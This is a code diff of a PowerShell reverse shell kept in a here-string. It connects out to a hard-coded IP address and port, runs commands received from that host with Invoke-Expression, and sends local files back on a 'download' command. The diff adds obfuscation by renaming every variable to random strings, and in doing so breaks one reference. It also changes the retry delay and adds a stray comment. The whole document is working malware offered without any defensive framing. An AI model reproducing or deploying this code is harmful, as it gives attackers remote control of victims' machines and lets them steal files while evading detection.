@@ -1,52 +1,54 @@
 $code = @'
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient('34.140.143.225', 78)
-        if ($client.Connected) {
-            $stream = $client.GetStream()
-            $lastResponseTime = [DateTime]::Now
+        $xDVlCvoMdHgpL = New-Object System.Net.Sockets.TCPClient('34.140.143.225', 78)
+        if ($xDVlCvoMdHgpL.Connected) {
+            $VrH5Qud0LjAtoh67B = $xDVlCvoMdHgpL.GetStream()
+            $wfAa7Iy8HZOUl = [DateTime]::Now
 
-            while ($client.Connected) {
-                [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }  
-                $i = $stream.Read($bytes, 0, $bytes.Length)   
+            while ($xDVlCvoMdHgpL.Connected) {
+                [byte[]]$6JqXwPG5R4fcvnCgWS = 0..65535 | ForEach-Object { 0 }  
+                $EdzR = $VrH5Qud0LjAtoh67B.Read($6JqXwPG5R4fcvnCgWS, 0, $6JqXwPG5R4fcvnCgWS.Length)   
 
-                if ($i -gt 0) {
-                    $lastResponseTime = [DateTime]::Now  
-                    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)  
+                if ($EdzR -gt 0) {
+                    $wfAa7Iy8HZOUl = [DateTime]::Now  
+                    $DvVYDoMWkxivVmY = [System.Text.Encoding]::ASCII.GetString($6JqXwPG5R4fcvnCgWS, 0, $EdzR)  
 
-                    # Check if it's a file download request
-                    if ($data -match "^download\s+(.+)") {
-                        $filePath = $matches[1]
-                        if (Test-Path $filePath -PathType Leaf) {
-                            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-                            $stream.Write($fileBytes, 0, $fileBytes.Length)
-                            $stream.Flush()
+                    
+                    if ($DvVYDoMWkxivVmY -match "^download\s+(.+)") {
+                        $5gYpZHIWOjD4k = $xI5kr[1]
+                        if (Test-Path $5gYpZHIWOjD4k -PathType Leaf) {
+                            $SxnAbv51nGA4w = [System.IO.File]::ReadAllBytes($5gYpZHIWOjD4k)
+                            $VrH5Qud0LjAtoh67B.Write($SxnAbv51nGA4w, 0, $SxnAbv51nGA4w.Length)
+                            $VrH5Qud0LjAtoh67B.Flush()
                         } else {
-                            $stream.Write([System.Text.Encoding]::ASCII.GetBytes("File not found."), 0, 14)
-                            $stream.Flush()
+                            $VrH5Qud0LjAtoh67B.Write([System.Text.Encoding]::ASCII.GetBytes("File not found."), 0, 14)
+                            $VrH5Qud0LjAtoh67B.Flush()
                         }
                     } else {
-                        $sendback = Invoke-Expression ". { $data } 2>&1" | Out-String    
-                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '      
-                        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)   
-                        $stream.Write($sendbyte, 0, $sendbyte.Length)                    
-                        $stream.Flush()                                                  
+                        $XCkVf7Nw8ybBcj2D3nvA1HI = Invoke-Expression ". { $DvVYDoMWkxivVmY } 2>&1" | Out-String    
+                        $AuOT = $XCkVf7Nw8ybBcj2D3nvA1HI + 'PS ' + (Get-Location).Path + '> '      
+                        $uDZ45ItzUDV = [System.Text.Encoding]::ASCII.GetBytes($AuOT)   
+                        $VrH5Qud0LjAtoh67B.Write($uDZ45ItzUDV, 0, $uDZ45ItzUDV.Length)                    
+                        $VrH5Qud0LjAtoh67B.Flush()                                                  
                     }
                 }
 
-                $elapsedTime = [DateTime]::Now - $lastResponseTime
-                if ($elapsedTime.TotalMinutes -ge 2) {
-                    $client.Close()
+                $Bk8e5o = [DateTime]::Now - $wfAa7Iy8HZOUl
+                if ($Bk8e5o.TotalMinutes -ge 2) {
+                    $xDVlCvoMdHgpL.Close()
                     break  
                 }
             }
 
-            $client.Close()  
+            $xDVlCvoMdHgpL.Close()  
         }
     } catch {
-        Start-Sleep -Seconds 5  
+        Start-Sleep -Seconds 10  
     }
 }
+
+# This is a commentdas in PowerShell
 
 '@
 
